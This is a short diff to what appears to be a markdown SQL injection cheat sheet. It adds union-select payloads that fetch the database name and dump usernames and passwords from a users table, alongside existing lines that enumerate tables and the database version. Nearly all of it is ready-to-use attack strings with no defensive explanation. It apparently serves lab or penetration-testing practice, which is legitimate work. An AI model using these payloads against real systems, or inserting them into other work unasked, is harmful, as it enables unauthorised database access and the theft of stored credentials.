@@ -6,8 +6,15 @@
 #### Enumerate database columns
 `SELECT * FROM information_schema.tables`
 
+#### Grab DB name
+`%’ or 0=0 union select null, database() #`
+
+#### Grab all column contents
+`%’ and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users # Click Submit`
+
 #### Grab a pw
 `1 or 1 =1 union Select 1, password from users`
+`1'union select null, concat_ws (char (32,58,32), user, password) from users #`
 
 #### Enumerate vesrion:
 `SELECT * FROM v$version`
